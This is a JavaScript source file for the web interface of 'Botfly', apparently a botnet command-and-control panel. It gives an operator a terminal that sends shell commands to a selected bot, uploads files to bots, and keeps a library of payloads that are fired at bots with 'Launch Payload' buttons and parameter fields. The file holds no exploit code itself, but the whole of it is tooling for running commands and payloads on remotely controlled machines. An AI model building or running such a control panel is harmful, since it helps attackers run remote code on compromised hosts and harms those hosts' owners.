/**
 * Created by EvanKing on 1/1/17.
 */

terminalFontSize = 14;
terminalMargin = 2;
lastOut = []

terminal = $('#terminal').terminal(function (command, term) {
    //no bot selected
    if ($.cookie("bot") == null) {
        terminal.error('No bot selected.');
        return;
    }
    if (command == 'kill') {
        $.get("/kill", function (response) {
            console.log(response)
        })
    }

    //send terminal command to server
    socket.emit('send_command', {data: command});
    socket.removeAllListeners('send_command'); //Sloppy, fix this if can. should be outside terminal function ideally
}, {
    greetings: 'Botfly Terminal',
    //update prompt to be name of current user
    prompt: function (callback) {
        if ($.cookie("bot") != null) {
            callback($.cookie("bot") + '> ');
        }
    },
    convertLinks: false,
    tabcompletion: true,
    completion: function (terminal, command, callback) {
        callback(commonCommands.concat(lastOut));
    },
    onClear: function (terminal) {
        $.get("/clear", function (response) {
            console.log(response)
        })
    },
});


//sets the terminal text color and font-size
function stdoutStyle(message) {
    return "[[;#90b1e5;black]" + message + "]";
}

function printOutStyle(message) {
    return "[[;#5cb85c;black]" + message + "]";
}

socket.on('response', function (msg) {
    //error returned from bot
    if (msg.user === $.cookie("bot")) {
        if (msg.printout != '') {
            terminal.echo(printOutStyle(msg.printout));
        }
        if (msg.errout != '') {
            terminal.error(msg.errout);
        }
        if (msg.stderr != '') {
            terminal.error(msg.stderr);
        }
        if (msg.stdout != "Server generated event" && msg.stdout != '') {
            lastOut = msg.stdout.split("\n");
            terminal.echo(stdoutStyle(msg.stdout));
        }
    }
});

//handle terminal text zoom in/out on hotkey commands
function handleZoom() {
    hotkeys('command+=, command+-', function (event, handler) {
        switch (handler.key) {
            case "command+=":
                terminalMargin += .15;
                terminalFontSize += .2;
                break;
            case "command+-":
                terminalMargin -= .15;
                terminalFontSize -= .2;
                break;
        }
        $('#terminalFont').text('.terminal-output, .cmd {font-size:' + terminalFontSize + 'px;}');
        $('#terminalMargin').text('.terminal div {margin-bottom:' + terminalMargin + 'px;}');
    });
}

//upload a file to the server
function uploadFile() {
    $('#upload-file').change(function () {
        //no bot selected
        if ($.cookie("bot") == null) {
            terminal.error('No bot selected.');
            return;
        }
        var form_data = new FormData($('#upload-file')[0]);
        $.ajax({
            type: 'POST',
            url: '/uploader',
            data: form_data,
            contentType: false,
            cache: false,
            processData: false,
            success: function (data) {
                if (JSON.parse(data).success) {
                    terminal.echo(stdoutStyle("File upload in progress..."))
                } else {
                    terminal.error(stdoutStyle("File upload failed"))
                }
            },
        });
    });
};

//upload a file to the server
function uploadPayload() {
    $('#upload-payload').change(function () {
        var form_data = new FormData($('#upload-payload')[0]);
        $.ajax({
            type: 'POST',
            url: '/payload',
            data: form_data,
            contentType: false,
            cache: false,
            processData: false,
            success: function (data) {
                if (JSON.parse(data).success) {
                    getPayloads()
                    terminal.echo(stdoutStyle("Payload upload successful."))
                } else {
                    terminal.error("Payload upload failed")
                }
            },
        });
    });
};

//upload a file to the server
function deletePayload(payload) {
    $.ajax({
        type: 'DELETE',
        url: '/payload',
        data: {"payload": payload},
        success: function (data) {
            if (JSON.parse(data).success) {
                getPayloads()
                terminal.echo(stdoutStyle("Payload deletion successful."))
            } else {
                terminal.error("Payload deletion failed")
            }
        },
    });

};


/******************************************
 Payload dictionary functions begins here *
 ******************************************/

var payloadsList = null;

// get current payload information
function getPayloads() {
    $.get("/payload", function (data, status) {
        console.log(data)
        saveData(data)
        populateDictionary(data)
        sendPayload()
        generateSearchBar()

    });
}

function populateDictionary(data, search) {
    search = search || null;
    var payloadManager = $('div.payloads')
    payloadManager.empty();
    for (var payload in data) {
        if (data.hasOwnProperty(payload)) {

            var payloadData = data[payload]
            var description = payloadData['description']
            var name = payloadData['name']
            var variables = payloadData['vars']
            var nameID = /[^/]*$/.exec(name)[0].split(" ")[0] + getRandomArbitrary(0, 10000);

            if (search == null || (name != null && name.toLowerCase().includes(search.toLowerCase())) || (description != null && description.toLowerCase().includes(search.toLowerCase()))) {

                var variablesList = $('<ul class="list-unstyled"></ul>')
                var varibaleInputList = $(' <div class="variable-inputs"></div>')

                //this naming got so out of hand...
                var hasVariables = false;
                for (var variable in variables) {
                    if (variables.hasOwnProperty(variable)) {
                        var variableID = variable + getRandomArbitrary(0, 10000);
                        var variableDict = variables[variable]

                        hasVariables = true

                        //append variable description
                        var variableItem = $('<li><div><inline><h5>' + variable + ': <span>' + variableDict['description'] + '</span></h5></inline></div></li>');
                        variableItem.appendTo(variablesList);

                        required = '';
                        if (!('default_value' in variableDict)) {
                            required = 'required';
                        }

                        //append variable input box
                        var varibaleInput = $('<div class="variable-inputs"><div class="input-group-sm margin-bottom"><input type="text" id="' + variableID + '" class="form-control ' + required + '" placeholder="' + variable + '"></div>')
                        varibaleInputList.append(varibaleInput);
                    }
                }
                if (hasVariables) {
                    variablesList.prepend('<h4>Parameters </h4>')
                }

                var panelBodyDiv = $('<div class="panel-body"> </div>')
                var panelBodyContent = $('</div><div><h4>Description </h4><p>' + description + '</p>')

                if (description != '') {
                    panelBodyDiv.append(panelBodyContent)
                }

                panelBodyDiv.append(variablesList)

                var inputRow = $('<div></div>')
                var launchButton = $('<button name="' + name + '" type="button" class="btn btn-danger btn-block send-payload">Launch Payload</button>')

                inputRow.append(varibaleInputList)
                inputRow.append(launchButton)

                panelBodyDiv.append(inputRow)

                var collapse = $(' <div id="collapse-' + nameID + '" class="panel-collapse collapse"></div>')
                collapse.append(panelBodyDiv)


                var collapseOuter = $(' <div class="panel panel-default"><div class="panel-heading"><h4 class="panel-title"><a data-toggle="collapse" data-parent="#accordion" href="#collapse-' + nameID + '">' + name + '</a></h4></div></div>')
                collapseOuter.append(collapse)

                payloadManager.append(collapseOuter)
            }
        }
    }
}

function saveData(data) {
    payloadsList = data;
}

// Returns a random number between min (inclusive) and max (exclusive)
function getRandomArbitrary(min, max) {
    return Math.floor(Math.random() * (max - min) + min);
}


function generateSearchBar() {
    // Listening for keyboard input on the search field.
    $('input.search-payload').on('input', function (e) {
        var value = this.value.trim();
        populateDictionary(payloadsList, value)
        sendPayload()
    });

}

function displayError(panel) {
    var error = $('<div class="alert alert-danger">Fill out all required parameters.</div>')
    panel.prepend(error)
    $('div.alert-danger').fadeOut(5000)
}

//launch payload
function sendPayload() {
    $("button.send-payload").click(function (e) {
        error = false;
        //no bot selected
        if ($.cookie("bot") == null) {
            terminal.error("No bot selected");
            return;
        }

        name = $(this).attr('name')
        postData = {"payload": name}


        $(this).parent().find("input").each(function () {
            postData[$(this).attr('placeholder')] = $(this).val()
            if ($(this).hasClass('required') && $(this).val() == '') {
                error = true;
            }
        });

        if (error) {
            displayError($(this).parent().parent())
            return;
        }

        $.ajax({
            type: "POST",
            url: "/payload",
            data: postData,
            success: function (data) {
                console.log(data)
            }
        });
    });
}


/******************************************
 On Document ready                        *
 ******************************************/

function setHeight() {
    var termHeight;
    $('#terminal').height(function () {
        termHeight = $(window).height() * 0.875;
        return termHeight
    });
    terminalOffset = $('#terminal').offset().top
    payloadDecOffset = $('div.payload-desc').offset().top

    difference = terminalOffset - payloadDecOffset

    $('div.payload-desc').css('max-height', function () {
        return termHeight + difference;
    });

    $('div.payload-desc').height(function () {
        return termHeight + difference;
    });
}

function log() {
    $.ajax({
        type: 'POST',
        url: '/log',
        data: null,
        contentType: false,
        cache: false,
        processData: false,
        success: function (data) {
            for (var index in data) {
                var entry = data[index];
                if (entry[0] == 0) {
                    terminal.echo(stdoutStyle(entry[1]));
                } else if (entry[0] == 1) {
                    terminal.error(entry[1]);
                }
            }
        }
    });
}

function setTerminalTextSize() {
    $('head').append('<style id="terminalFont" type="text/css">.terminal-output, .cmd {font-size:' + terminalFontSize + 'px;}</style>');
    $('head').append('<style id="terminalMargin" type="text/css">.terminal div {margin-bottom:' + terminalMargin + 'px;}</style>');
}

$(document).ready(function () {
    handleZoom()
    getPayloads()
    setHeight()
    log()
    setTerminalTextSize()
    uploadFile()
    uploadPayload()
});
